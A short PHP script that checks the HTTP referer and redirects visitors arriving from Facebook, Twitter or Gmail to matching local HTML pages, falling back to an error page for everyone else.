<?php
$ref = $_SERVER['HTTP_REFERER'];


if (strpos($ref, "facebook"))	{ header('Location: redirect/facebook.html'); }
if (strpos($ref, "twitter"))	{ header('Location: redirect/twitter.html'); }
if (strpos($ref, "gmail"))  { header('Location: redirect/gmail.html'); }

require('error.php');

?>
